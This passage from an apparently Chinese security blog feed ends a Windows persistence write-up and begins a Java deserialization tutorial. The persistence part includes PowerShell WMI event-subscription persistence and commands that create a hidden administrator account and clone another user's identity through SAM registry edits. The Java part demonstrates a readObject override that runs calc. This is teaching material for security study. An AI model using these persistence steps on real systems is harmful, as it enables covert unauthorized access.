class="hljs-string">&quot;root\cimv2&quot;</span>;QueryLanguage=<span class="hljs-string">&quot;WQL&quot;</span>;Query=<span class="hljs-variable">$Query</span>&#125; <span class="hljs-literal">-ErrorAction</span> Stop<br><span class="hljs-variable">$WMIEventConsumer</span> = <span class="hljs-built_in">Set-WmiInstance</span> <span class="hljs-literal">-Class</span> CommandLineEventConsumer <span class="hljs-literal">-Namespace</span> <span class="hljs-string">&quot;root\subscription&quot;</span> <span class="hljs-literal">-Arguments</span> <span class="hljs-selector-tag">@</span>&#123;Name=<span class="hljs-variable">$consumerName</span>;ExecutablePath=<span class="hljs-variable">$exePath</span>;CommandLineTemplate=<span class="hljs-variable">$exePath</span>&#125;<br><span class="hljs-built_in">Set-WmiInstance</span> <span class="hljs-literal">-Class</span> __FilterToConsumerBinding <span class="hljs-literal">-Namespace</span> <span class="hljs-string">&quot;root\subscription&quot;</span> <span class="hljs-literal">-Arguments</span> <span class="hljs-selector-tag">@</span>&#123;<span class="hljs-keyword">Filter</span>=<span class="hljs-variable">$WMIEventFilter</span>;Consumer=<span class="hljs-variable">$WMIEventConsumer</span>&#125;<br></code></pre></td></tr></table></figure><p>可以使用Autoruns进行查看</p><p><img src="/img/windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/27.png"></p><h1 id="0x13-影子用户"><a href="#0x13-影子用户" class="headerlink" title="0x13 影子用户"></a>0x13 影子用户</h1><p>影子用户即创建的隐藏用户，它无法通过普通命令进行查询，比较隐蔽。</p><p>这里以win10作为演示</p><p>们先利用命令创建一个隐藏用户,并将其加入本地管理员组。</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">net</span> user <span class="hljs-keyword">test</span>$ 123456 /add<br><span class="hljs-keyword">net</span> localgroup administrators <span class="hljs-keyword">test</span>$ /add<br></code></pre></td></tr></table></figure><p><img src="/img/windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/28.png"></p><p> net user无法查看</p><p><img src="/img/windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/29.png"></p><p> 但是可以在计算机管理和登陆页面中看到</p><p><img src="/img/windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/30.png"></p><p><img src="/img/windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/31.png"></p><h2 id="解决办法"><a href="#解决办法" class="headerlink" title="解决办法:"></a>解决办法:</h2><p>打开注册表:</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">HKEY_LOCAL_MACHINE<span class="hljs-symbol">\S</span>AM<span class="hljs-symbol">\S</span>AM<br></code></pre></td></tr></table></figure><p>修改权限:<br><img src="/img/windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/32.png"></p><p><img src="/img/windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/33.png"></p><p> 修改完权限之后，我们重新启动注册表即可继续查看内容。</p><h3 id="查看F值"><a href="#查看F值" class="headerlink" title="查看F值"></a>查看F值</h3><p><img src="/img/windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/34.png"></p><p> 导出这三个值</p><p><img src="/img/windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/35.png"></p><p>test$导出为<code>1.reg</code><br>000003EC包含<code>test$</code>用户的F值，导出另存为<code>2.reg</code><br>000003E9包含<code>WIN10</code>用户的F值，导出另存为<code>3.reg</code></p><p><img src="/img/windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/36.png"></p><p>将2.reg中的F值替换为3.reg中的F值，即将test$用户的F值替换为WIN10用户的F值</p><p><img src="/img/windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/37.png"></p><h3 id="删除test"><a href="#删除test" class="headerlink" title="删除test$"></a>删除test$</h3><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">net <span class="hljs-keyword">user</span> <span class="hljs-title">test</span>$ /del<br></code></pre></td></tr></table></figure><p><img src="/img/windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/38.png"></p><p>注册表就已经无法打开了<br><img src="/img/windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/39.png"></p><h3 id="导入注册表"><a href="#导入注册表" class="headerlink" title="导入注册表"></a>导入注册表</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">regedit</span> /s <span class="hljs-number">1</span>.reg<br><span class="hljs-attribute">regedit</span> /s <span class="hljs-number">2</span>.reg<br></code></pre></td></tr></table></figure><h3 id="查看效果"><a href="#查看效果" class="headerlink" title="查看效果"></a>查看效果</h3><p><img src="/img/windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/40.png"></p><p> 但登录界面已经没有账户</p><p><img src="/img/windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/41.png"></p><p> 3389直接登录,以test$账号登录</p><p>但是登陆之后的身份却是原来WIN10用户，桌面也是原用户的，达到克隆效果。</p><p><img src="/img/windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/42.png"></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>一边复现一边写,发现很多都需要权限，或者说如果有更高的权限能做的事更加的多,包括很多操作现在已经被各种终端设备监控,所以维权实际上是建立在免杀和提权之后的。我总结的可能不太全面,欢迎补充。</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://hackergu.com/power-shadowuser/">https://hackergu.com/power-shadowuser/</a></p><p><a href="https://www.freebuf.com/articles/system/229209.html">https://www.freebuf.com/articles/system/229209.html</a></p><p><a href="https://www.freebuf.com/column/165235.html">https://www.freebuf.com/column/165235.html</a></p><p><a href="https://zhuanlan.zhihu.com/p/102081047">https://zhuanlan.zhihu.com/p/102081047</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>从0学习DNSURL利用链</title>
    <link href="/2021/09/01/%E4%BB%8E0%E5%AD%A6%E4%B9%A0URLDNS/"/>
    <url>/2021/09/01/%E4%BB%8E0%E5%AD%A6%E4%B9%A0URLDNS/</url>
    
    <content type="html"><![CDATA[<h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>  断断续续学习了java好几个月了，从康师傅到java漫谈，还是经历了许多心酸历程。文中有一些自己的拙见，也参考了大牛的教学文章。总而言之，是从对java一无所知，学习后分析URLDNS利用链的文章。</p><h2 id="0x02-java反射机制"><a href="#0x02-java反射机制" class="headerlink" title="0x02 java反射机制"></a>0x02 java反射机制</h2><h3 id="什么是java反射"><a href="#什么是java反射" class="headerlink" title="什么是java反射"></a>什么是java反射</h3><blockquote><p>Java反射机制是在运行状态时，对于任意一个类，都能够获取到这个类的所有属性和方法；对于任意一个对象，都能够调用它的任意一个方法和属性(包括私有的方法和属性)，这种动态获取的信息以及动态调用对象的方法的功能就称为java语言的反射机制。</p></blockquote><p>看起来比较抽象,下面以代码形式说明反射:</p><p>先创建一个Person类:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Person</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span> age;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">toString</span><span class="hljs-params">()</span></span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;User&#123;&quot;</span> + <span class="hljs-string">&quot;name=&quot;</span> + name + <span class="hljs-string">&quot;, age&quot;</span>+ age +<span class="hljs-string">&quot;&#125;&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getName</span><span class="hljs-params">()</span></span>&#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setName</span><span class="hljs-params">(String name)</span></span>&#123;<br>        <span class="hljs-keyword">this</span>.name =name;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">getAge</span><span class="hljs-params">()</span></span>&#123;<br>        <span class="hljs-keyword">return</span> age;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setAge</span><span class="hljs-params">(<span class="hljs-keyword">int</span> age)</span></span>&#123;<br>        <span class="hljs-keyword">this</span>.age = age;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>那么这里有一个类了,像上面说的,我们怎么获得该类的方法或者属性呢？</p><p>还是先来一个demo:下面的代码是通过反射调用了<code>Person</code>类的<code>setName</code>方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Reflection02</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String args[])</span> </span>&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Person person = <span class="hljs-keyword">new</span> Person();<br>            Class clazz = person.getClass();<br>            <span class="hljs-comment">//Class clazz = org.sd.Person.class;</span><br>            <span class="hljs-comment">//Class clazz = Class.forName(&quot;org.sd.Person&quot;);</span><br>            Method method = clazz.getMethod(<span class="hljs-string">&quot;setName&quot;</span>, String.class);<br>            method.invoke(person, <span class="hljs-string">&quot;Tom&quot;</span>);<br>            System.out.println(person);<br>        &#125; <span class="hljs-keyword">catch</span> (NoSuchMethodException e) &#123;<br>            e.printStackTrace();<br>        &#125; <span class="hljs-keyword">catch</span> (InvocationTargetException e) &#123;<br>            e.printStackTrace();<br>        &#125; <span class="hljs-keyword">catch</span> (IllegalAccessException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>运行结果为:</p><p><img src="/img/%E4%BB%8E0%E5%AD%A6%E4%B9%A0java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1.png"></p><p>可以看到可以执行<code>setName</code>方法，并且是通过如下几行代码来实现的:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">Person person = <span class="hljs-keyword">new</span> Person();<br>Class clazz = person.getClass();<br>Method method = clazz.getMethod(<span class="hljs-string">&quot;setName&quot;</span>, String.class);<br>method.invoke(person, <span class="hljs-string">&quot;Tom&quot;</span>);<br></code></pre></td></tr></table></figure><p>接下来让我们分析一下这几行代码的含义。</p><h3 id="三种方式可获得Class类实例"><a href="#三种方式可获得Class类实例" class="headerlink" title="三种方式可获得Class类实例"></a>三种方式可获得Class类实例</h3><ol><li><code>getClass()</code>函数:调用某个对象的getClass方法可获得该类的Class类的实例。第二行代码正是通过这种方式获取到Class类的实例。</li><li><code>forName()</code>静态方法:Class clazz = Class.forName(“org.sd.Person”);</li><li>访问某个类的class属性，这个属性就存储着这个类对应的Class类的实例:Class clazz = org.sd.Person.class</li></ol><p>上面介绍的三种方式皆可获取到某个类的Class类的实例，只不过在demo中使用的是getClass方法。</p><h3 id="获取方法"><a href="#获取方法" class="headerlink" title="获取方法"></a>获取方法</h3><blockquote><p>Method类位于java.lang.reflect包下,在Java反射中Method类描述的是类的方法信息（包括：方法修饰符、方法名称、参数列表等等）。</p></blockquote><p>java中所有的方法都是Method类型，通过<code>getMthod()</code>方法可以获得某一个Class实例的某一个方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//代码第三行</span><br>clazz.getMethod(String name, Class[] params);<span class="hljs-comment">//获得类的特定方法,name参数指定方法的名字,params参数指定方法的参数类型</span><br></code></pre></td></tr></table></figure><p>获取方法的方式不止这一种，还有如下方法:</p><ol><li>getMethods(): 获得类的public类型的方法</li><li>getDeclaredMethods(): 获取类中所有的方法(public、protected、default、private)</li><li>getDeclaredMethod(String name, Class[] params): 获得类的特定方法,name参数指定方法的名字,params参数指定方法的参数类型</li></ol><h3 id="调用方法"><a href="#调用方法" class="headerlink" title="调用方法"></a>调用方法</h3><p>Method类中有一个<code>invoke</code>方法，用来调用特定的方法，函数定义为:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">invoke</span><span class="hljs-params">(Object obj, Object... args)</span></span>;<br><span class="hljs-comment">//第一个参数是方法属于的对象（如果是静态方法，则可以直接传 null）</span><br><span class="hljs-comment">//第二个可变参数是该方法的参数</span><br></code></pre></td></tr></table></figure><p>那么代码第四行:实际上就是调用了person对象的setName方法，并传入一个参数“Tom”给setName。</p><h2 id="0x03-java反序列化"><a href="#0x03-java反序列化" class="headerlink" title="0x03 java反序列化"></a>0x03 java反序列化</h2><h3 id="为什么需要序列化"><a href="#为什么需要序列化" class="headerlink" title="为什么需要序列化"></a>为什么需要序列化</h3><p>提到反序列化，先需要了解序列化是什么。</p><p>问自己这样一个问题:为什么需要序列化？我认为理解了为什么需要序列化也就明白了什么是序列化。</p><p>jvm一旦关闭，那么java中的对象也就销毁了。假设程序员想要持久化储存该对象或者在网络上传输，怎么办？就需要将这个对象写入磁盘里，怎么写？将一个对象进行序列化后写入。时势造英雄，正因为有这种需求，序列化应运而生了。</p><blockquote><p>序列化：把对象转换为字节序列 。</p><p>反序列化：把字节序列转换为对象。</p></blockquote><h3 id="满足序列化条件"><a href="#满足序列化条件" class="headerlink" title="满足序列化条件"></a>满足序列化条件</h3><p>并非每一个对象都是可序列化的。能够序列化的对象有如下特征：</p><ol><li>实现了<code>java.io.Serializable</code>接口。</li><li>该类的所有属性必须是可序列化的。</li></ol><p>这里稍微细说一下，看一下Serializable接口</p><p><img src="/img/%E4%BB%8E0%E5%AD%A6%E4%B9%A0java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/5.png"></p><p>发现里面什么都没写，实际上Serializable接口仅仅作为一个标识。</p><blockquote><p>接口没有定义任何方法，它是一个空接口。我们把这样的空接口称为“标记接口”（Marker Interface），实现了标记接口的类仅仅是给自身贴了个“标记”。</p></blockquote><h3 id="如何序列化一个对象"><a href="#如何序列化一个对象" class="headerlink" title="如何序列化一个对象"></a>如何序列化一个对象</h3><blockquote><p>要序列化一个对象，首先要创建<code>OutputStream</code>对象，再将其封装在一个<code>ObjectOutputStream</code>对象内，接着只需调用<code>writeObject()</code>即可将对象序列化，并将其发送给<code>OutputStream</code>（对象是基于字节的，因此要使用InputStream和OutputStream来继承层次结构）。</p></blockquote><blockquote><p>要反序列化出一个对象，需要将一个<code>InputStream</code>封装在<code>ObjectInputStream</code>内，然后调用<code>readObject()</code>即可。</p></blockquote><p>还是先上代码：通过序列化将<code>User(&quot;tony&quot;,18)</code>这个实例序列化存储(User.ser)后。又反序列化该文件获取对象，并读取该对象属性。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs java">    <span class="hljs-meta">@Test</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">test2</span><span class="hljs-params">()</span></span>&#123;<br>        User user = <span class="hljs-keyword">new</span> User(<span class="hljs-string">&quot;tony&quot;</span>,<span class="hljs-number">18</span>);<br>        <span class="hljs-keyword">try</span>&#123;<br>            <span class="hljs-comment">//创建一个FileOutputStream,同时会创建一个User.ser文件</span><br>            FileOutputStream fos = <span class="hljs-keyword">new</span> FileOutputStream(<span class="hljs-string">&quot;./User.ser&quot;</span>);<br>            <span class="hljs-comment">//将该FileOutputStream封装到ObjectOutputStream中</span><br>            ObjectOutputStream os = <span class="hljs-keyword">new</span> ObjectOutputStream(fos);<br>            <span class="hljs-comment">//调用writeObject方法,系列化对象到文件User.ser中</span><br>            os.writeObject(user);<br>            <span class="hljs-comment">//序列化结束</span><br><br>            System.out.println(<span class="hljs-string">&quot;读取数据：&quot;</span>);<br><br>            <span class="hljs-comment">//创建FileInputStream对象</span><br>            FileInputStream fis = <span class="hljs-keyword">new</span> FileInputStream(<span class="hljs-string">&quot;./user.ser&quot;</span>);<br>            <span class="hljs-comment">//将FileInputStream封装到ObjectInputStream</span><br>            ObjectInputStream is = <span class="hljs-keyword">new</span> ObjectInputStream(fis);<br>            <span class="hljs-comment">//调用readObject从user.ser中反序列化出对象。需要类型转化,默认是object</span><br>            User user1 = (User)is.readObject();<br><br>            user1.info();<br>        &#125; <span class="hljs-keyword">catch</span> (FileNotFoundException e) &#123;<br>            e.printStackTrace();<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            e.printStackTrace();<br>        &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Serializable</span></span>&#123;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span> age;<br><br>    User()&#123;<br><br>    &#125;<br>    User(String name,<span class="hljs-keyword">int</span> age)&#123;<br>        <span class="hljs-keyword">this</span>.name = name;<br>        <span class="hljs-keyword">this</span>.age = age;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">toString</span><span class="hljs-params">()</span></span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;User&#123;&quot;</span> + <span class="hljs-string">&quot;name=&quot;</span> + name + <span class="hljs-string">&quot;, age&quot;</span>+age+<span class="hljs-string">&quot;&#125;&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getName</span><span class="hljs-params">()</span></span>&#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setName</span><span class="hljs-params">(String name)</span></span>&#123;<br>        <span class="hljs-keyword">this</span>.name =name;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">getAge</span><span class="hljs-params">()</span></span>&#123;<br>        <span class="hljs-keyword">return</span> age;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setAge</span><span class="hljs-params">(<span class="hljs-keyword">int</span> age)</span></span>&#123;<br>        <span class="hljs-keyword">this</span>.age = age;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">info</span><span class="hljs-params">()</span></span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;Name: &quot;</span>+name+<span class="hljs-string">&quot;, Age: &quot;</span>+age);<br>    &#125;<br>    <span class="hljs-comment">//readObject重写</span><br>   <span class="hljs-comment">// private void readObject(ObjectInputStream input) throws IOException, ClassNotFoundException&#123;</span><br>        <span class="hljs-comment">//System.out.println(&quot;[*]执行了自定义的readObject函数&quot;);</span><br>        <span class="hljs-comment">//Runtime.getRuntime().exec(&quot;calc&quot;);</span><br>    <span class="hljs-comment">//&#125;</span><br>&#125;<br></code></pre></td></tr></table></figure><p>运行结果:</p><p><img src="/img/%E4%BB%8E0%E5%AD%A6%E4%B9%A0java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/2.png"></p><p>并且在上级目录写入了一个<code>user.ser</code>文件</p><p><img src="/img/%E4%BB%8E0%E5%AD%A6%E4%B9%A0java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/3.png"></p><p>使用liunx中的<code>xxd</code>命令可以看下他的内容</p><p><img src="/img/%E4%BB%8E0%E5%AD%A6%E4%B9%A0java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/4.png"></p><p><code>aced</code>是java序列化的一个标志，声明了该文件为序列化后的文件。像pe文件的4d5a一样，是说明该文件类型的标志。</p><p><code>0005</code>是序列化协议版本。</p><h3 id="反序列化可能带来的危害"><a href="#反序列化可能带来的危害" class="headerlink" title="反序列化可能带来的危害"></a>反序列化可能带来的危害</h3><p>java中执行系统命令的方式:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ExecTest</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception</span>&#123;<br>        Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>注意上一小节代码最后几行的注释部分，现在取消注释，重新运行代码：</p><p><img src="/img/%E4%BB%8E0%E5%AD%A6%E4%B9%A0java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/6.png"></p><p>发现执行了命令，运行了计算器。</p><p>也就是当<code>readObject()</code>方法被重写的的话，反序列化该类时调用便是重写后的<code>readObject()</code>方法。如果该方法书写不当的话就有可能引发恶意代码的执行。</p><h2 id="0x04-RMI"><a href="#0x04-RMI" class="headerlink" title="0x04 RMI"></a>0x04 RMI</h2><h3 id="什么是RMI"><a href="#什么是RMI" class="headerlink" title="什么是RMI"></a>什么是RMI</h3><p>RMI全称是<code>Remote Method Invocation</code>，远程⽅法调⽤，在Java在JDK1.2中实现。能够让在客户端Java虚拟机上的对象像调用本地对象一样调用服务端Java虚拟机中的对象上的方法。客户端比如说是在手机，然后服务端是在电脑；同时都有java环境，然后手机端调用电脑端那边的某个方法。</p><p>RMI依赖的默认通信协议为JRMP(Java Remote Message Protocol ，Java 远程消息交换协议)，这是运行在Java RMI之下、TCP/IP之上的线路层协议。该协议为Java定制，要求服务端与客户端都为Java编写。这个协议就像HTTP协议一样，规定了客户端和服务端通信要满足的规范。在RMI传输过程中，对象实际上就是通过序列化方式进行编码传输的。（等会儿验证）</p><p>RMI分为三个主体部分：</p><ul><li>Client-客户端：客户端调用服务端的方法</li><li>Server-服务端：远程调用方法对象的提供者，也是代码真正执行的地方，执行结束会返回给客户端一个方法执行的结果。</li><li>Registry-注册中心：用于客户端查询要调用的方法的引用。</li></ul><p><img src="/img/%E4%BB%8E0%E5%AD%A6%E4%B9%A0java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/8.png"></p><p>RMI远程调用方法为:</p><ol><li>客户调用客户端辅助对象<code>stub</code>上的方法</li><li>客户端辅助对象<code>stub</code>打包调用信息（变量，方法名），通过网络发送给服务端辅助对象<code>skeleton</code></li><li>服务端辅助对象<code>skeleton</code>将客户端辅助对象发送来的信息解包，找出真正被调用的方法以及该方法所在对象</li><li>调用真正服务对象上的真正方法，并将结果返回给服务端辅助对象<code>skeleton</code></li><li>服务端辅助对象将结果打包，发送给客户端辅助对象<code>stub</code></li><li>客户端辅助对象将返回值解包，返回给调用者</li><li>客户获得返回值</li></ol><p><img src="/img/%E4%BB%8E0%E5%AD%A6%E4%B9%A0java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/7.png"></p><h3 id="实现一个RMI"><a href="#实现一个RMI" class="headerlink" title="实现一个RMI"></a>实现一个RMI</h3><p>先实现一个接口继承<code>java.rmi.Remote</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">IRemoteHelloWorld</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Remote</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">hello</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> java.rmi.RemoteException</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="注册中心"><a href="#注册中心" class="headerlink" title="注册中心"></a>注册中心</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Registry</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span></span>&#123;<br>        <span class="hljs-keyword">try</span>&#123;<br>            LocateRegistry.createRegistry(<span class="hljs-number">1099</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (RemoteException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>        <span class="hljs-keyword">while</span>(<span class="hljs-keyword">true</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h4><p>继承<code>UnicastRemoteObject</code>类，并实现上面定义的接口。将Server类实例化后绑定到注册中心注册的地址。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td 